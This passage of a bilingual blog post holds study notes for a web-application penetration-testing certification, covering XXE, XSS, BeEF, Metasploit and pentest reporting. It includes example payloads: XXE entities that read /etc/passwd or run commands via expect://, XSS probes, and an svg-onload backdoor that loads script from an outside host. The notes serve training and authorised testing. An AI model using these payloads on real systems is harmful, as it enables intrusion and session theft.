<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">foo</span> <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="string">&quot;It works!!!&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">author</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">auther</span>&gt;</span></span><br><span class="line">  ...</span><br><span class="line"><span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>Display local file: (LFI)</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span> &gt;</span>]&gt;</span><br></pre></td></tr></table></figure>

<p>Access URL:</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://sec542.org/robots.txt&quot;</span> &gt;</span>]&gt;</span><br></pre></td></tr></table></figure>

<p>RCE via PHP:</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;expect://id&quot;</span> &gt;</span>]&gt;</span><br></pre></td></tr></table></figure>
<p>Require PHP ‘expect’ module to be enabled</p>
<p>XXE is often triggered via PHP. Cna’t be shown in Burp or ZAP as it’s server to server.<br>So it’s always blind , attacker cannot see the source code, cannot have any direct evidence.</p>
<h2 id="Document-Object-Model-DOM"><a href="#Document-Object-Model-DOM" class="headerlink" title="Document Object Model (DOM)"></a>Document Object Model (DOM)</h2><p>object-oriented representation of a web page.<br>Allow program to change a document’s structure, style and content. </p>
<p>Everything in HTML can be a part of DOM. –&gt; node in a tree. </p>
<p>Inspect the element through web browser… Developer tools</p>
<p>JavaScript is an object-oriented  language JS经常被用来操作DOM树。<br>内置的对象有：String, Date, Array 等。与HTML 相关: windows 和 document<br><code>Document.cookie</code></p>
<h2 id="XSS-Primer"><a href="#XSS-Primer" class="headerlink" title="XSS Primer"></a>XSS Primer</h2><p>OTG-CLIENT-003: HTML Injection<br>XSS 非常常见，并且相对于其他种类的漏洞，更难以防止。</p>
<p>原理就是在输入中包含HTML代码(JS)，然后在显示的时候被页面执行…</p>
<p>Same-Origin Policy (SOP) - 最为基础的网络安全组件 不允许其他域来访问自己的资源 【端口；协议；域名需要完全一致<br>SOP通过浏览器来实现</p>
<blockquote>
<p>Browser Security Handbook<br><a target="_blank" rel="noopener" href="https://code.google.com/archive/p/browsersec/wikis/Main.wiki">https://code.google.com/archive/p/browsersec/wikis/Main.wiki</a></p>
</blockquote>
<p>但是对于Cookie而言，SOP相对来说没有那么严格。<br>外部的JS代码也可以修改本地的Cookie</p>
<p>渗透测试中，一般往往不会去尝试绕过SOP，利用浏览器的漏洞（非WEB范围）</p>
<p>在渗透测试中，不要使用Alert弹窗来说明XSS漏洞，需要用一些更有效的例子来解释漏洞。</p>
<h2 id="Classes-of-XSS"><a href="#Classes-of-XSS" class="headerlink" title="Classes of XSS"></a>Classes of XSS</h2><p>反射型；储存型；DOM型；<br>反射型：在URL中包含XSS的payload，但是要进行URL编码<br>储存型：博客评论，论坛数据，消息他功能，日志机制，账号信息…</p>
<h2 id="XSS-Discovery"><a href="#XSS-Discovery" class="headerlink" title="XSS Discovery"></a>XSS Discovery</h2><p>输入一段比较特殊的字符串，观察该字符串是否会在页面返回回客户端<br><code> &lt;&gt;()=&#39;&quot;/;[]&#123;&#125;$--#&amp;//</code><br><code>&lt;script&gt;alert(42)&lt;/script&gt;</code></p>
<p><code>&lt;img src=&quot;x&quot; onerror=alert(42); /&gt;</code><br><code>424242&quot; onload=&quot;alert(42)</code>   如果输入的值显示在某个HTML闭合标签的属性的值中<br>如果输入的字符串回显在JS代码标签中，则可以直接加入JS代码，但要注意闭合function</p>
<p>更多例子：<br><a target="_blank" rel="noopener" href="https://owasp.org/www-community/xss-filter-evasion-cheatsheet">https://owasp.org/www-community/xss-filter-evasion-cheatsheet</a> </p>
<p>Fuzzdb &amp;&amp; JBroFuzz</p>
<h2 id="XSS-impacts"><a href="#XSS-impacts" class="headerlink" title="XSS impacts"></a>XSS impacts</h2><p>Session Abuse<br>steal cookie, and use location to send to remote location. (没有HTTPOnly flag)</p>
<p> 创建可交互式后门<br> <code>&lt;svg onload=setInterval(function()&#123;d=document; z=d.createElement(&quot;script&quot;);z.src=&quot;//sec542.org:1234&quot;; d.body.appendChild(z)&#125;,0)&gt;</code></p>
<h2 id="XSS-Tools"><a href="#XSS-Tools" class="headerlink" title="XSS Tools"></a>XSS Tools</h2><p> Burp: Battering Ram + Grep Payloads   查找是否有回显</p>
<ul>
<li><p>xsssniper<br> <code>xsssniper -u &quot;http://sec542.org&quot; --crawl --forms</code></p>
</li>
<li><p>XSSer</p>
</li>
<li><p>XSScrapy</p>
</li>
</ul>
<h2 id="BeEF"><a href="#BeEF" class="headerlink" title="BeEF"></a>BeEF</h2><p> BeEF hook 是一个JS文件，可以让浏览器变成一个僵尸节点</p>
<p> BeEF 控制器Ruby编写，像服务器一样运行，可以控制</p>
<p> 可以创建各种浏览器利用场景。</p>
<h2 id="AJAX"><a href="#AJAX" class="headerlink" title="AJAX"></a>AJAX</h2><p> 介绍略去<br> 通过XHR(XMLHttpRequest)实现。可以在后台发送链接来交换数据，同时不需要刷新整个页面</p>
<p> 非常难以发现所有的AJAX接口。Burp和ZAP现在提供了AJAX爬虫，但是不能要求太高。利用起来与普通的页面是一样的</p>
<p> JS frameworks: 可以从源代码中看出使用了哪种JS框架。<br> 通过检查版本，来判断是否存在漏洞。  Burp Retire.js</p>
<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><h2 id="Logic-Attacks"><a href="#Logic-Attacks" class="headerlink" title="Logic Attacks"></a>Logic Attacks</h2><p> OTG-BUSLOGIC-001~9</p>
<h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><p>Web Libraries: </p>
<ul>
<li>urillib, urllib2, urllib3, httplib, httplib2, <strong>Requests</strong></li>
</ul>
<h2 id="WPScan"><a href="#WPScan" class="headerlink" title="WPScan"></a>WPScan</h2><h2 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h2><p>最常被用来网络和系统利用，经常会被Web Application的渗透工程师忽视。但是其实有很多实用的模块可以使用。</p>
<p><code>msf &gt; search [keyword]</code> </p>
<ul>
<li><p>db_import<br>可以导入某些软件的输出文件 (XML)</p>
</li>
<li><p>WMAP<br>Metasploit的网络应用扫描插件</p>
</li>
</ul>
<p>-BeEF<br>通过BeEF可以hook被攻击者的浏览器，但是通过这种方式非常难以实现持久化，同时在系统层面也只能获得非常有限的权限。</p>
<p><code>/opt/beef/config.yaml</code> 中启用metasploit<br><code>msf &gt; load msgrpc ServerHost=127.0.0.1 Pass=[password]</code> 启动插件<br><code>/opt/beef/extensions/metasploit/config.yaml</code> 中，配置前面设定的密码<br><code> sudo /opt/beef/beef</code> </p>
<ul>
<li>Sqlmap &lt;-&gt; Metasploit<br>–os-pwn<br>–priv-esc</li>
</ul>
<h2 id="Drupal"><a href="#Drupal" class="headerlink" title="Drupal"></a>Drupal</h2><p> 非常广泛使用的CMS<br>但是功能模块中经常包含不少漏洞。 CMS本身也往往是渗透测试中的高价值对象。</p>
<h2 id="When-Tools-Fail"><a href="#When-Tools-Fail" class="headerlink" title="When Tools Fail"></a>When Tools Fail</h2><h2 id="Business-of-Pentesting-Preparation"><a href="#Business-of-Pentesting-Preparation" class="headerlink" title="Business of Pentesting: Preparation"></a>Business of Pentesting: Preparation</h2><ul>
<li>Preparation<br>Practice Lab: <a target="_blank" rel="noopener" href="https://www.amanhardikar.com/mindmaps/Practice.html">https://www.amanhardikar.com/mindmaps/Practice.html</a><br>CTF Time：<br>Build own <a target="_blank" rel="noopener" href="https://www.sans.org/blog/building-a-pen-test-lab-hardware-for-hacking-at-home-on-the-cheap/">https://www.sans.org/blog/building-a-pen-test-lab-hardware-for-hacking-at-home-on-the-cheap/</a><br><a target="_blank" rel="noopener" href="https://pen-testing.sans.org/holiday-challenge/2012">https://pen-testing.sans.org/holiday-challenge/2012</a></li>
</ul>
<p>Toolkit: 准备好工具集：Kali</p>
<p>Permission; Scope; Rules of Engagement<br>攻击者的详细信息<br>白名单<br>测试账号 - 每个权限级别两个测试账号<br>确保存在备份</p>
<p>沟通交流: 拉上相关人员，IT，开发，运维，owner…；记录定期会议，确认哪个级别的漏洞会进行紧急沟通。确认最后结果的呈现形式，大多数情况是报告。<br>加密信息的传输方式；最后的结果交给哪些人</p>
<h2 id="Methodology"><a href="#Methodology" class="headerlink" title="Methodology"></a>Methodology</h2><p>PTES!! 非常好。<br>OTG<br>根据报告，任何一个技能达标的渗透测试人员应该可以重现漏洞。</p>
<p>Black Gray White</p>
<p>NIST800-30  Threat Modeling</p>
<p>Source Code Review </p>
<p>Pentesting</p>
<h2 id="Post-Assessment"><a href="#Post-Assessment" class="headerlink" title="Post Assessment"></a>Post Assessment</h2><p>考虑不同的读者：管理层，应用的赞助人对业务影响更感兴趣<br>开发者和IT技术人员需要更多的技术细节</p>
<p>Report (OTG v4)<br>Executive Summary (1-2 页): 时间，目标，结果的摘要，重点关注高危漏洞，确保建议能被目标对象有权利执行。</p>
<p>Test Parameter：</p>
<ul>
<li>目标Objective</li>
<li>范围 Scope</li>
<li>时间Schedule</li>
<li>Targets 应用名称，应用的技术和功能</li>
<li>Limitations 存在的困难和限制，声明</li>
<li>Finding的总结</li>
<li>解决方法 Remediation</li>
</ul>
<p>Findings<br>逐个列出发现的漏洞，截图，做了什么，测了什么，等级，改进方法</p>
<p>Appendices</p>
<ul>
<li>keybase.io  加密传输</li>
<li>某一个发现有多个URL</li>
<li>命令行输出</li>
<li>通过漏洞获取的数据</li>
<li>…</li>
</ul>
<p>Report Automation<br>缩减重复工作的时间，更好地在测试过程中记录下重要的信息</p>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="reward-container">
  <div>请我一杯咖啡吧！</div>
  <button>
    赞赏
  </button>
  <div class="post-reward">
      <div>
        <img src="../../images/wechatpay.png" alt="UPWNothing 微信">
        <span>微信</span>
      </div>
      <div>
        <img src="../../images/alipay.png" alt="UPWNothing 支付宝">
        <span>支付宝</span>
      </div>
      <div>
        <img src="../../images/bitcoin.png" alt="UPWNothing 比特币">
        <span>比特币</span>
      </div>

  </div>
</div>

          <div class="post-tags">
              <a href="../../tags/Certification/" rel="tag"># Certification</a>
              <a href="../../tags/GWAPT/" rel="tag"># GWAPT</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="../e8e3dab8/" rel="prev" title="渗透测试报告自动化工具PwnDoc(二)">
                  <i class="fa fa-angle-left"></i> 渗透测试报告自动化工具PwnDoc(二)
                </a>
            </div>
            <div class="post-nav-item">
                <a href="../../en-US/7f89c159/" rel="next" title="Goby - "You Don't Have Permission to Capture on This Device" Issue">
                  Goby - "You Don't Have Permission to Capture on This Device" Issue <i class="fa fa-angle-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






    <div class="comments utterances-container"></div>
</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">
  <div class="languages">
    <label class="lang-select-label">
      <i class="fa fa-language"></i>
      <span>简体中文</span>
      <i class="fa fa-angle-up" aria-hidden="true"></i>
    </label>
    <select class="lang-select" data-canonical="" aria-label="选择语言">
      
        <option value="zh-CN" data-href="../../bef99fab/" selected="">
          简体中文
        </option>
      
        <option value="en" data-href="../../en/bef99fab/" selected="">
          English
        </option>
      
    </select>
  </div>

  <div class="copyright">
    &copy; 2017 – 
    <span itemprop="copyrightYear">2023</span>
    <span class="with-love">
      <i class="paw"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">UPWNothing</span>
  </div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
    <span title="站点总字数">59k</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="站点阅读时长">54 分钟</span>
  </span>
</div>
<div class="busuanzi-count">
    <span class="post-meta-item" id="busuanzi_container_site_uv">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-item" id="busuanzi_container_site_pv">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div><script color="72,97,152" opacity="0.8" zIndex="-1" count="199" src="https://cdnjs.cloudflare.com/ajax/libs/canvas-nest.js/2.0.4/canvas-nest.js"></script>


    </div>
  </footer>

  
  <div class="reading-progress-bar"></div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.20/fancybox/fancybox.umd.js" integrity="sha256-q8XkJ6dj5VwSvzI8+nATCHHQG+Xv/dAZBCgqmu93zOY=" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/lozad.js/1.16.0/lozad.min.js" integrity="sha256-mOFREFhqmHeQbXpK2lp4nA3qooVgACfh88fpJftLBbc=" crossorigin="anonymous"></script>
<script src="../../js/comments.js"></script><script src="../../js/utils.js"></script><script src="../../js/motion.js"></script><script src="../../js/next-boot.js"></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
<script src="../../js/third-party/search/local-search.js"></script>




  <script src="../../js/third-party/fancybox.js"></script>

  <script src="../../js/third-party/pace.js"></script>


  
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>




<script class="next-config" data-name="utterances" type="application/json">{"enable":true,"repo":"UPWNothing/UPWNothing.github.io","issue_term":"pathname","theme":"github-dark"}</script>
<script src="../../js/third-party/comments/utterances.js"></script>

</body>
</html>
